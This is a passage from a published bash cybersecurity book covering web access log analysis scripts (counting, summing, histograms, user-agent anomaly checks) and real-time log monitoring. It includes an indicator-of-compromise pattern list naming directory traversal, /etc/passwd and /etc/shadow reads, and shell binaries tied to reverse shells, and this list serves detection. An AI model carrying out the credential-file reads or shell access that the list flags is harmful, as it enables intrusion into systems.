Paul Troncone & 
 Carl Albing, PhD
Cybersecurity  
Ops with bash
Attack, Defend, and Analyze from  
the Command Line
Paul Troncone and Carl Albing
Cybersecurity Ops with bash
Attack, Defend, and Analyze from the
Command Line
Boston
Farnham
Sebastopol
Tokyo
Beijing
Boston
Farnham
Sebastopol
Tokyo
Beijing
978-1-492-04131-3
[LSI]
Cybersecurity Ops with bash
by Paul Troncone and Carl Albing
Copyright © 2019 Digadel Corp & Carl Albing. All rights reserved.
Printed in the United States of America.
Published by O’Reilly Media, Inc., 1005 Gravenstein Highway North, Sebastopol, CA 95472.
O’Reilly books may be purchased for educational, business, or sales promotional use. Online editions are
also available for most titles (http://oreilly.com). For more information, contact our corporate/institutional
sales department: 800-998-9938 or corporate@oreilly.com.
Acquisitions Editor: Rachel Roumeliotis
Developmental Editors: Virginia Wilson and John
Devins
Production Editor: Nan Barber
Copyeditor: Sharon Wilkey
Proofreader: Christina Edwards
Indexer: Ellen Troutman-Zaig
Interior Designer: David Futato
Cover Designer: Karen Montgomery
Illustrator: Rebecca Demarest
April 2019:
 First Edition
Revision History for the First Edition
2019-04-01: First Release
2020-04-24: Second Release
See http://oreilly.com/catalog/errata.csp?isbn=9781492041313 for release details.
The O’Reilly logo is a registered trademark of O’Reilly Media, Inc. Cybersecurity Ops with bash, the cover
image, and related trade dress are trademarks of O’Reilly Media, Inc.
The views expressed in this work are those of the authors, and do not represent the publisher’s views.
While the publisher and the authors have used good faith efforts to ensure that the information and
instructions contained in this work are accurate, the publisher and the authors disclaim all responsibility
for errors or omissions, including without limitation responsibility for damages resulting from the use of
or reliance on this work. Use of the information and instructions contained in this work is at your own
risk. If any code samples or other technology this work contains or describes is subject to open source
licenses or the intellectual property rights of others, it is your responsibility to ensure that your use
thereof complies with such licenses and/or rights.
To Erin and Kiera. You bring joy to every moment of my life.
—Paul
 
To Cynthia, and our sons Greg, Eric, and Andrew.
—Carl
Table of Contents
Preface. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  xiii
no extra words, xtra will be given the value of the null string (which won’t matter
either way because we don’t use it).
Here we use that string as the index and increment its previous value. For the
first use of the index, the previous value will be unset, which will be taken as zero.
This syntax lets us iterate over all the various index values that we encountered.
Note, however, that the order is not guaranteed to be alphabetical or in any other
specific order due to the nature of the hashing algorithm for the index values.
In printing out the value and key, we put the values inside quotes so that we
always get a single value for each argument—even if that value had a space or two
inside it. It isn’t expected to happen with our use of this script, but such coding
practices make the scripts more robust when used in other situations.
And Example 7-4 shows another version, this time using awk.
Example 7-4. countem.awk
# Cybersecurity Ops with bash
# countem.awk
92 
| 
Chapter 7: Data Analysis
#
# Description:
# Count the number of instances of an item using awk
#
# Usage:
# countem.awk < inputfile
#
awk '{ cnt[$1]++ }
END { for (id in cnt) {
        printf "%d %s\n", cnt[id], id
      }
    }'
Both will work nicely in a pipeline of commands like this:
cut -d' ' -f1 logfile | bash countem.sh
The cut command is not really necessary here for either version. Why? Because the
awk script explicitly references the first field (with $1), and in the shell script it’s
because of how we coded the read command (see ). So we can run it like this:
bash countem.sh < logfile
For example, to count the number of times an IP address made a HTTP request that
resulted in a 404 (Page Not Found) error:
$ awk '$9 == 404 {print $1}' access.log | bash countem.sh
1 192.168.0.36
2 192.168.0.37
1 192.168.0.11
You can also use grep 404 access.log and pipe it into countem.sh, but that would
include lines where 404 appears in other places (e.g., the byte count, or part of a file
path). The use of awk here restricts the counting only to lines where the returned sta‐
tus (the ninth field) is 404. It then prints just the IP address (field 1) and pipes the
output into countem.sh to get the total number of times each IP address made a
request that resulted in a 404 error.
To begin analysis of the example access.log file, you can start by looking at the hosts
that accessed the web server. You can use the Linux cut command to extract the first
field of the logfile, which contains the source IP address, and then pipe the output
into the countem.sh script. The exact command and output is shown here.
$ cut -d' ' -f1 access.log | bash countem.sh | sort -rn
111 192.168.0.37
55 192.168.0.36
51 192.168.0.11
42 192.168.0.14
28 192.168.0.26
Counting Occurrences in Data 
| 
93
If you do not have countem.sh available, you can use the uniq com‐
mand -c option to achieve similar results, but it will require an
extra pass through the data using sort to work properly.
$ cut -d' ' -f1 access.log | sort | uniq -c | sort -rn
111 192.168.0.37
55 192.168.0.36
51 192.168.0.11
42 192.168.0.14
28 192.168.0.26
Next, you can further investigate by looking at the host that had the most requests,
which as can be seen in the preceding code is IP address 192.168.0.37, with 111. You
can use awk to filter on the IP address, then pipe that into cut to extract the field that
contains the request, and finally pipe that output into countem.sh to provide the total
number of requests for each page:
$ awk '$1 == "192.168.0.37" {print $0}' access.log | cut -d' ' -f7
| bash countem.sh
1 /uploads/2/9/1/4/29147191/31549414299.png?457
14 /files/theme/mobile49c2.js?1490908488
1 /cdn2.editmysite.com/images/editor/theme-background/stock/iPad.html
1 /uploads/2/9/1/4/29147191/2992005_orig.jpg
. . .
14 /files/theme/custom49c2.js?1490908488
The activity of this particular host is unimpressive, appearing to be standard web-
browsing behavior. If you take a look at the host with the next highest number of
requests, you will see something a little more interesting:
$ awk '$1 == "192.168.0.36" {print $0}' access.log | cut -d' ' -f7
| bash countem.sh
1 /files/theme/mobile49c2.js?1490908488
1 /uploads/2/9/1/4/29147191/31549414299.png?457
1 /_/cdn2.editmysite.com/.../Coffee.html
1 /_/cdn2.editmysite.com/.../iPad.html
. . .
1 /uploads/2/9/1/4/29147191/601239_orig.png
This output indicates that host 192.168.0.36 accessed nearly every page on the web‐
site exactly one time. This type of activity often indicates web-crawler or site-cloning
activity. If you take a look at the user agent string provided by the client, it further
verifies this conclusion:
$ awk '$1 == "192.168.0.36" {print $0}' access.log | cut -d' ' -f12-17 | uniq
"Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
94 
| 
Chapter 7: Data Analysis
The user agent identifies itself as HTTrack, which is a tool used to download or clone
websites. While not necessarily malicious, it is interesting to note during analysis.
You can find additional information on HTTrack at the HTTrack
website.
Totaling Numbers in Data
Rather than just count the number of times an IP address or other item occurs, what 
if you wanted to know the total byte count that has been sent to an IP address—or
which IP addresses have requested and received the most data?
The solution is not that much different from countem.sh: you just need a few small
changes. First, you need more columns of data by tweaking the input filter (the cut
command) to extract two columns (IP address and byte count) rather than just IP
address. Second, you will change the calculation from an increment, (let cnt[$id]+
+) a simple count, to be a summing of that second field of data (let cnt[$id]+=
$data).
The pipeline to invoke this will now extract two fields from the logfile, the first and
the last:
cut -d' ' -f 1,10 access.log | bash summer.sh
The script summer.sh, shown in Example 7-5, reads in two columns of data. The first
column consists of index values (in this case, IP addresses) and the second column is
a number (in this case, number of bytes sent by the IP address). Every time the script
finds a repeat IP address in the first column, it then adds the value of the second col‐
umn to the total byte count for that IP address, thus totaling the number of bytes sent
by the IP address.
Example 7-5. summer.sh
#!/bin/bash -
#
# Cybersecurity Ops with bash
# summer.sh
#
# Description:
# Sum the total of field 2 values for each unique field 1
#
# Usage: ./summer.sh
#   input format: <name> <number>
#
Totaling Numbers in Data 
| 
95
declare -A cnt        # assoc. array
while read id count
do
  let cnt[$id]+=$count
done
for id in "${!cnt[@]}"
do
    printf "%-15s %8d\n"  "${id}"  "${cnt[${id}]}" 
done
Note that we’ve made a few other changes to the output format. With the output
format, we’ve added field sizes of 15 characters for the first string (the IP address
in our sample data), left-justified (via the minus sign), and eight digits for the
sum values. If the sum is larger, it will print the larger number, and if the string is
longer, it will be printed in full. We’ve done this to get the data to align, by and
large, nicely in columns, for readability.
You can run summer.sh against the example access.log file to get an idea of the total
amount of data requested by each host. To do this, use cut to extract the IP address
and bytes transferred fields, and then pipe the output into summer.sh:
$ cut -d' ' -f1,10 access.log | bash summer.sh | sort -k 2.1 -rn
192.168.0.36     4371198
192.168.0.37     2575030
192.168.0.11     2537662
192.168.0.14     2876088
192.168.0.26      665693
These results can be useful in identifying hosts that have transferred unusually large
amounts of data compared to other hosts. A spike could indicate data theft and exfil‐
tration. If you identify such a host, the next step would be to review the specific pages
and files accessed by the suspicious host to try to classify it as malicious or benign.
Displaying Data in a Histogram
You can take counting one step further by providing a more visual display of the
results. You can take the output from countem.sh or summer.sh and pipe it into yet
another script, one that will produce a histogram-like display of the results.
The script to do the printing will take the first field as the index to an associative
array, and the second field as the value for that array element. It will then iterate
through the array and print a number of hashtags to represent the count, scaled to 50
# symbols for the largest count in the list.
96 
| 
Chapter 7: Data Analysis
Example 7-6. histogram.sh
#!/bin/bash -
#
# Cybersecurity Ops with bash
# histogram.sh
#
# Description:
# Generate a horizontal bar chart of specified data
#
# Usage: ./histogram.sh
#   input format: label value
#
function pr_bar ()                            
{
    local -i i raw maxraw scaled              
    raw=$1
    maxraw=$2
    ((scaled=(MAXBAR*raw)/maxraw))            
    # min size guarantee
    ((raw > 0 && scaled == 0)) && scaled=1    
    for((i=0; i<scaled; i++)) ; do printf '#' ; done
    printf '\n'
} # pr_bar
#
# "main"
#
declare -A RA 
 
 
 
 
 
declare -i MAXBAR max
max=0
MAXBAR=50 
# how large the largest bar should be
while read labl val
do
    let RA[$labl]=$val  
 
 
 
    # keep the largest value; for scaling
    (( val > max )) && max=$val
done
# scale and print it
for labl in "${!RA[@]}"  
 
 
 
do
    printf '%-20.20s  ' "$labl"
    pr_bar ${RA[$labl]} $max 
 
 
 
done
Displaying Data in a Histogram 
| 
97
We define a function to draw a single bar of the histogram. This definition must
be encountered before a call to the function can be made, so it makes sense to put
function definitions at the front of our script. We will be reusing this function in
a future script, so we could have put it in a separate file and included it here with
a source command—but we didn’t.
We declare all these variables as local because we don’t want them to interfere
with variable names in the rest of this script (or any others, if we copy/paste this
script to use elsewhere). We declare all these variables as integers (that’s the -i
option) because we are going to only compute values with them and not use
them as strings.
The computation is done inside double parentheses. Inside those, we don’t need
to use the $ to indicate “the value of” each variable name.
This is an “if-less” if statement. If the expression inside the double parentheses is
true, then, and only then, is the second expression (the assignment) executed.
This will guarantee that scaled is never zero when the raw value is nonzero.
Why? Because we’d like something to show up in that case.
The main part of the script begins with a declaration of the RA array as an asso‐
ciative array.
Here we reference the associative array by using the label, a string, as its index.
Because the array is not indexed by numbers, we can’t just count integers and use
them as indices. This construct gives all the various strings that were used as an
index to the array, one at a time, in the for loop.
We use the label as an index one more time to get the count and pass it as the first
parameter to our pr_bar function.
Note that the items don’t appear in the same order as the input. That’s because the
hashing algorithm for the key (the index) doesn’t preserve ordering. You could take
this output and pipe it into yet another sort, or you could take a slightly different
approach.
Example 7-7 is a version of the histogram script that preserves order—by not using
an associative array. This might also be useful on older versions of bash (pre 4.0),
prior to the introduction of associative arrays. Only the “main” part of the script is
shown, as the function pr_bar remains the same.
98 
| 
Chapter 7: Data Analysis
Example 7-7. histogram_plain.sh
#!/bin/bash -
#
# Cybersecurity Ops with bash
# histogram_plain.sh
#
# Description:
# Generate a horizontal bar chart of specified data without
# using associative arrays, good for older versions of bash
#
# Usage: ./histogram_plain.sh
#   input format: label value
#
declare -a RA_key RA_val                                 
declare -i max ndx
max=0
maxbar=50    # how large the largest bar should be
ndx=0
while read labl val
do
    RA_key[$ndx]=$labl                                   
    RA_value[$ndx]=$val
    # keep the largest value; for scaling
    (( val > max )) && max=$val
    let ndx++
done
# scale and print it
for ((j=0; j<ndx; j++))                                  
do
    printf "%-20.20s  " ${RA_key[$j]}
    pr_bar ${RA_value[$j]} $max
done
This version of the script avoids the use of associative arrays, in case you are running
an older version of bash (prior to 4.x), such as on macOS systems. For this version,
we use two separate arrays—one for the index value and one for the counts. Because
they are normal arrays, we have to use an integer index, and so we will keep a simple
count in the variable ndx.
Here the variable names are declared as arrays. The lowercase a says that they are
arrays, but not of the associative variety. While not strictly necessary, this is good
practice. Similarly, on the next line we use the -i to declare these variables as
integers, making them more efficient than undeclared shell variables (which are
stored as strings). Again, this is not strictly necessary, as seen by the fact that we
don’t declare maxbar but just use it.
Displaying Data in a Histogram 
| 
99
The key and value pairs are stored in separate arrays, but at the same index loca‐
tion. This approach is “brittle”—that is, easily broken, if changes to the script
ever got the two arrays out of sync.
Now the for loop, unlike the previous script, is a simple counting of an integer
from 0 to ndx. The variable j is used here so as not to interfere with the index in
the for loop inside pr_bar, although we were careful enough inside the function
to declare its version of i as local to the function. Do you trust it? Change the j to
an i here and see if it still works (it does). Then try removing the local declara‐
tion and see if it fails (it does).
This approach with the two arrays does have one advantage. By using the numerical
index for storing the label and the data, you can retrieve them in the order they were
read in—in the numerical order of the index.
You can now visually see the hosts that transferred the largest number of bytes by
extracting the appropriate fields from access.log, piping the results into summer.sh,
and then into histogram.sh:
$ cut -d' ' -f1,10 access.log | bash summer.sh | bash histogram.sh
192.168.0.36          ##################################################
192.168.0.37          #############################
192.168.0.11          #############################
192.168.0.14          ################################
192.168.0.26          #######
Although this might not seem that useful for the small amount of sample data, being
able to visualize trends is invaluable when looking across larger datasets.
In addition to looking at the number of bytes transferred by IP address or host, it is
often interesting to look at the data by date and time. To do that, you can use the
summer.sh script, but due to the format of the access.log file, you need to do a little
more processing before you can pipe it into the script. If you use cut to extract the
date/time and bytes transferred fields, you are left with data that causes some prob‐
lems for the script:
$ cut -d' ' -f4,10 access.log
[12/Nov/2017:15:52:59 2377
[12/Nov/2017:15:52:59 4529
[12/Nov/2017:15:52:59 1112
As shown in the preceding output, the raw data starts with a [ character. That causes
a problem with the script because it denotes the beginning of an array in bash. To
remedy that, you can use an additional iteration of the cut command with -c2- to
remove the character. This option tells cut to extract the data by character, starting at
100 
| 
Chapter 7: Data Analysis
position 2 and going to the end of the line (-). The corrected output with the square
bracket removed is shown here:
$ cut -d' ' -f4,10 access.log | cut -c2-
12/Nov/2017:15:52:59 2377
12/Nov/2017:15:52:59 4529
12/Nov/2017:15:52:59 1112
Alternatively, you can use tr in place of the second cut. The -d
option will delete the character specified—in this case, the square
bracket.
cut -d' ' -f4,10 access.log | tr -d '['
You also need to determine how you want to group the time-bound data: by day,
month, year, hour, etc. You can do this by simply modifying the option for the second
cut iteration. Table 7-3 illustrates the cut option to use to extract various forms of the
date/time field. Note that these cut options are specific to Apache logfiles.
Table 7-3. Apache log date/time field extraction
Date/time extracted Example output
Cut option
Entire date/time
12/Nov/2017:19:26:09
-c2-21
Month, day, and year
12/Nov/2017
-c2-12
Month and year
Nov/2017
-c5-12
Full time
19:26:04
-c14-21
Hour
19
-c14-15
Year
2017
-c9-12
The histogram.sh script can be particularly useful when looking at time-based data.
For example, if your organization has an internal web server that is accessed only
during working hours of 9:00 A.M. to 5:00 P.M., you can review the server log file on
a daily basis via the histogram view to see whether spikes in activity occur outside
normal working hours. Large spikes of activity or data transfer outside normal work‐
ing hours could indicate exfiltration by a malicious actor. If any anomalies are detec‐
ted, you can filter the data by that particular date and time and review the page
accesses to determine whether the activity is malicious.
For example, if you want to see a histogram of the total amount of data that was
retrieved on a certain day and on an hourly basis, you can do the following:
$ awk '$4 ~ "12/Nov/2017" {print $0}' access.log | cut -d' ' -f4,10 |
cut -c14-15,22- | bash summer.sh | bash histogram.sh
17              ##
Displaying Data in a Histogram 
| 
101
16              ###########
15              ############
19              ##
18              ##################################################
Here the access.log file is sent through awk to extract the entries from a particular date.
Note the use of the like operator (~) instead of ==, because field 4 also contains time
information. Those entries are piped into cut to extract the date/time and bytes
transferred fields, and then piped into cut again to extract just the hour. From there,
it is summed by hour by using summer.sh and converted into a histogram by using
histogram.sh. The result is a histogram that displays the total number of bytes trans‐
ferred each hour on November 12, 2017.
Pipe the output from the histogram script into sort -n to get the
output in numerical (hour) order. Why is the sort needed? The
scripts summer.sh and histogram.sh are both generating their out‐
put by iterating through the list of indices of their associative
arrays. Therefore, their output will not likely be in a sensible order
(but rather in an order determined by the internal hashing algo‐
rithm). If that explanation left you cold, just ignore it and remem‐
ber to use a sort on the output.
If you want to have the output ordered by the amount of data,
you’ll need to add the sort between the two scripts. You’ll also need
to use histogram_plain.sh, the version of the histogram script that
doesn’t use associative arrays.
Finding Uniqueness in Data
Previously, IP address 192.168.0.37 was identified as the system that had the largest
number of page requests. The next logical question is, what pages did this system
request? With that answer, you can start to gain an understanding of what the system
was doing on the server and categorize the activity as benign, suspicious, or mali‐
cious. To accomplish that, you can use awk and cut and pipe the output into coun‐
tem.sh:
$ awk '$1 == "192.168.0.37" {print $0}' access.log | cut -d' ' -f7 |
bash countem.sh | sort -rn | head -5
14 /files/theme/plugin49c2.js?1490908488
14 /files/theme/mobile49c2.js?1490908488
14 /files/theme/custom49c2.js?1490908488
14 /files/main_styleaf0e.css?1509483497
3 /consulting.html
Although this can be accomplished by piping together commands and scripts, that
requires multiple passes through the data. This may work for many datasets, but it is
102 
| 
Chapter 7: Data Analysis
too inefficient for extremely large datasets. You can streamline this by writing a bash
script specifically designed to extract and count page accesses, and this requires only
a single pass over the data. Example 7-8 shows this script.
Example 7-8. pagereq.sh
# Cybersecurity Ops with bash
# pagereq.sh
#
# Description:
# Count the number of page requests for a given IP address using bash
#
# Usage:
# pagereq <ip address> < inputfile
#   <ip address> IP address to search for
#
declare -A cnt                                             
while read addr d1 d2 datim gmtoff getr page therest
do
    if [[ $1 == $addr ]] ; then let cnt[$page]+=1 ; fi
done
for id in ${!cnt[@]}                                       
do
    printf "%8d %s\n" ${cnt[$id]} $id
done
We declare cnt as an associative array so that we can use a string as the index to
the array. In this program, we will be using the page address (the URL) as the
index.
The ${!cnt[@]} results in a list of all the different index values that have been
encountered. Note, however, that they are not listed in any useful order.
Early versions of bash do not have associative arrays. You can use awk to do the same
thing—count the various page requests from a particular IP address—since awk has
associative arrays.
Example 7-9. pagereq.awk
# Cybersecurity Ops with bash
# pagereq.awk
#
# Description:
# Count the number of page requests for a given IP address using awk
#
# Usage:
# pagereq <ip address> < inputfile
Finding Uniqueness in Data 
| 
103
#   <ip address> IP address to search for
#
# count the number of page requests from an address ($1)
awk -v page="$1" '{ if ($1==page) {cnt[$7]+=1 } }                
END { for (id in cnt) {                                          
    printf "%8d %s\n", cnt[id], id
    }
}'
There are two very different $1 variables on this line. The first $1 is a shell vari‐
able and refers to the first argument supplied to this script when it is invoked.
The second $1 is an awk variable. It refers to the first field of the input on each
line. The first $1 has been assigned to the awk variable page so that it can be com‐
pared to each $1 of awk (that is, to each first field of the input data).
This simple syntax results in the variable id iterating over the values of the index
values to the cnt array. It is much simpler syntax than the shell’s "${!cnt[@]}"
syntax, but with the same effect.
You can run pagereq.sh by providing the IP address you would like to search for and
redirect access.log as input:
$ bash pagereq.sh 192.168.0.37 < access.log | sort -rn | head -5
14 /files/theme/plugin49c2.js?1490908488
14 /files/theme/mobile49c2.js?1490908488
14 /files/theme/custom49c2.js?1490908488
14 /files/main_styleaf0e.css?1509483497
3 /consulting.html
Identifying Anomalies in Data
On the web, a user-agent string is a small piece of textual information sent by a
browser to a web server that identifies the client’s operating system, browser type,
version, and other information. It is typically used by web servers to ensure page
compatibility with the user’s browser. Here is an example of a user-agent string:
Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
This user-agent string identifies the system as Windows NT version 6.3 (aka Win‐
dows 8.1), with 64-bit architecture, and using the Firefox browser.
The user agent string is interesting for two reasons: first, because of the significant
amount of information it conveys, which can be used to identify the types of systems
and browsers accessing the server; second, because it is configurable by the end user,
which can be used to identify systems that may not be using a standard browser or
may not be using a browser at all (i.e., a web crawler).
104 
| 
Chapter 7: Data Analysis
You can identify unusual user agents by first compiling a list of known-good user
agents. For the purposes of this exercise, we will use a very small list that is not spe‐
cific to a particular version; see Example 7-10.
Example 7-10. useragents.txt
Firefox
Chrome
Safari
Edge
For a list of common user agent strings, visit the TechBlog site.
You can then read in a web server log and compare each line to each valid user agent
until you get a match. If no match is found, it should be considered an anomaly and
printed to standard output along with the IP address of the system making the
request. This provides yet another vantage point into the data, identifying systems
with unusual user agents, and another path to further explore.
Example 7-11. useragents.sh
#!/bin/bash -
#
# Cybersecurity Ops with bash
# useragents.sh
#
# Description:
# Read through a log looking for unknown user agents
#
# Usage: ./useragents.sh  <  <inputfile>
#   <inputfile> Apache access log
#
# mismatch - search through the array of known names
#  returns 1 (false) if it finds a match
#  returns 0 (true) if there is no match
function mismatch ()                                    
{
    local -i i                                          
    for ((i=0; i<$KNSIZE; i++))
    do
        [[ "$1" =~ .*${KNOWN[$i]}.* ]] && return 1      
    done
Identifying Anomalies in Data 
| 
105
    return 0
}
# read up the known ones
readarray -t KNOWN < "useragents.txt"                      
KNSIZE=${#KNOWN[@]}                                     
# preprocess logfile (stdin) to pick out ipaddr and user agent
awk -F'"' '{print $1, $6}' | \
while read ipaddr dash1 dash2 dtstamp delta useragent   
do
    if mismatch "$useragent"
    then
        echo "anomaly: $ipaddr $useragent"
    fi
done
We will use a function for the core of this script. It will return a success (or
“true”) if it finds a mismatch; that is, if it finds no match against the list of known
user agents. This logic may seem a bit inverted, but it makes the if statement
containing the call to mismatch read clearly.
Declaring our for loop index as a local variable is good practice. It is not strictly
necessary in this script but is a good habit.
There are two strings to compare: the input from the logfile and a line from the
list of known user agents. To make for a very flexible comparison, we use the
regex comparison operator (the =~). The .* (meaning “zero or more instances of
any character”) placed on either side of the $KNOWN array reference means that the
known string can appear anywhere within the other string for a match.
Each line of the file is added as an element to the array name specified. This gives
us an array of known user agents. There are two identical ways to do this in bash:
either readarray, as used here, or mapfile. The -t option removes the trailing
newline from each line read. The file containing the list of known user agents is
specified here; modify as needed.
This computes the size of the array. It is used inside the mismatch function to
loop through the array. We calculate it here, once, outside our loop to avoid
recomputing it every time the function is called.
The input string is a complex mix of words and quote marks. To capture the user
agent string, we use the double quote as the field separator. Doing that, however,
means that our first field contains more than just the IP address. By using the
bash read, we can parse on the spaces to get the IP address. The last argument of
106 
| 
Chapter 7: Data Analysis
the read takes all the remaining words so it can capture all the words of the user
agent string.
When you run useragents.sh, it will output any user agent strings not found in the
useragents.txt file:
$ bash useragents.sh < access.log
anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
.
.
.
anomaly: 192.168.0.36 Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)
Summary
In this chapter, we looked at statistical analysis techniques to identify unusual and
anomalous activity in logfiles. This type of analysis can provide you with insights into
what occurred in the past. In the next chapter, we look at how to analyze logfiles and
other data to provide insights into what is happening on a system in real time.
Workshop
1. The following example uses cut to print the first and tenth fields of the access.log
file:
$ cut -d' ' -f1,10 access.log | bash summer.sh | sort -k 2.1 -rn
Replace the cut command with the awk command. Do you get the same results?
What might be different about those two approaches?
2. Expand the histogram.sh script to include the count at the end of each histogram
bar. Here is sample output:
192.168.0.37          #############################    2575030
192.168.0.26          ####### 665693
3. Expand the histogram.sh script to allow the user to supply the option -s that
specifies the maximum bar size. For example, histogram.sh -s 25 would limit
the maximum bar size to 25 # characters. The default should remain at 50 if no
option is given.
4. Modify the useragents.sh script to add some parameters:
a. Add code for an optional first parameter to be a filename of the known hosts.
If not specified, default to the name known.hosts as it currently is used.
Summary 
| 
107
b. Add code for an -f option to take an argument. The argument is the filename
of the logfile to read rather than reading from stdin.
5. Modify the pagereq.sh script to not need an associative array but to work with a
traditional array that uses a numerical index. Convert the IP address into a 10- to
12-digit number for that use. Caution: Don’t have leading zeros on the number,
or the shell will attempt to interpret it as an octal number. Example: Convert
“10.124.16.3” into “10124016003,” which can be used as a numerical index.
Visit the Cybersecurity Ops website for additional resources and the answers to these
questions.
108 
| 
Chapter 7: Data Analysis
CHAPTER 8
Real-Time Log Monitoring
The ability to analyze a log after an event is an important skill. It is equally important 
to be able to extract information from a logfile in real time to detect malicious or sus‐
picious activity as it happens. In this chapter, we explore methods to read in log
entries as they are generated, format them for output to the analyst, and generate
alerts based on known indicators of compromise.
Maintenance, Monitoring, and Analysis of Audit Logs is identified
as a top 20 security control by the Center for Internet Security. To
learn more, visit the CIS Controls page.
Monitoring Text Logs
The most basic method to monitor a log in real time is to use the tail command’s -f
option, which continuously reads a file and outputs new lines to stdout as they are
added. As in previous chapters, we will use an Apache web server access log for
examples, but the techniques presented can be applied to any text-based log. To mon‐
itor the Apache access log with tail:
tail -f /var/logs/apache2/access.log
Commands can be combined to provide more-advanced functionality. The output
from tail can be piped into grep so only entries matching specific criteria will be
output. The following example monitors the Apache access log and outputs entries
matching a particular IP address:
tail -f /var/logs/apache2/access.log | grep '10.0.0.152'
109
Regular expressions can also be used. In this example, only entries returning an
HTTP status code of 404 Page Not Found will be displayed; the -i option is added to
ignore character case:
tail -f /var/logs/apache2/access.log | egrep -i 'HTTP/.*" 404'
To clean up the output, it can be piped into the cut command to remove extraneous
information. This example monitors the access log for requests, resulting in a 404
status code and then uses cut to display only the date/time and the page that was
requested:
$ tail -f access.log | egrep --line-buffered 'HTTP/.*" 404' | cut -d' ' -f4-7
[29/Jul/2018:13:10:05 -0400] "GET /test
[29/Jul/2018:13:16:17 -0400] "GET /test.txt
[29/Jul/2018:13:17:37 -0400] "GET /favicon.ico
You can further clean the output by piping it into tr -d '[]"' to remove the square
brackets and the orphan double quotation.
Note that we used the egrep command’s --line-buffered option. This forces egrep
to output to stdout each time a line break occurs. Without this option, buffering
occurs, and output is not piped into cut until a buffer is filled. We don’t want to wait
that long. This option will have egrep write out each line as it finds it.
Command-Line Buffers
So what’s going on with buffering? Imagine that egrep is finding lots of lines that
match the pattern specified for it. Then egrep would have a lot of output to produce.
But output (in fact, any input or output) is much more “expensive” (takes more time)
than straight computing (searching for text). So the fewer the I/O calls, the more effi‐
cient the program will be.
What the grep family of programs do, on finding a match, is copy a matching line
into a large area of memory called a buffer, which has enough room to hold many
lines of text. After finding and copying many lines that match, the buffer will fill up.
Then grep makes one call to output the entire buffer. Imagine a case where grep can
fit 50 matching lines into the buffer. Instead of making 50 output calls, one for each
line, it needs to make only one call. That’s 50 times more efficient!
That works well for most uses of egrep, such as when we are searching through a file. 
The egrep program will write each line to the buffer as it finds it, and it doesn’t take
that long to get to the end of the file. When the end of the file is reached, it will flush
the buffer—that is, it will write out the contents of the buffer, even if it’s only partially
filled, because no more data will be coming in. When the input is coming from a file,
that usually happens quickly.
110 
| 
Chapter 8: Real-Time Log Monitoring
But when reading from a pipe, especially our example, where tail -f is putting data
into the pipe only occasionally (when certain events happen), then there isn’t neces‐
sarily enough data to fill a buffer (and flush it) soon enough for us to see it in “real
time.” We would have to wait until the buffer fills—which might be hours or even
days later.
The solution is to tell egrep to use the more inefficient technique of writing out each
line, one at a time, as it is found. It keeps the data moving through the pipeline as
soon as each match is found.
Log-Based Intrusion Detection
You can use the power of tail and egrep to monitor a log and output any entries that
match known patterns of suspicious or malicious activity, often referred to as indica‐
tors of compromise (IOCs). By doing this, you can create a lightweight intrusion
detection system (IDS). To begin, let’s create a file that contains regex patterns for
IOCs, as shown in Example 8-1.
Example 8-1. ioc.txt
\.\./ 
etc/passwd 
etc/shadow
cmd\.exe 
/bin/sh
/bin/bash
This pattern (../) is an indicator of a directory traversal attack: the attacker tries
to escape from the current working directory and access files for which they
otherwise would not have permission.
The Linux etc/passwd and etc/shadow files are used for system authentication and
should never be available through the web server.
Serving the cmd.exe, /bin/sh, or /bin/bash files is an indicator of a reverse shell
being returned by the web server. A reverse shell is often an indicator of a suc‐
cessful exploitation attempt.
Note that the IOCs must be in a regular expression format, as they will be used later
with egrep.
Monitoring Text Logs 
| 
111
IOCs for web servers are too numerous to discuss here in depth.
For more examples of indicators of compromise, download the lat‐
est at Snort community ruleset.
Next, ioc.txt can be used with the egrep -f option. This option tells egrep to read in
the regex patterns to search for from the specified file. This allows you to use tail to
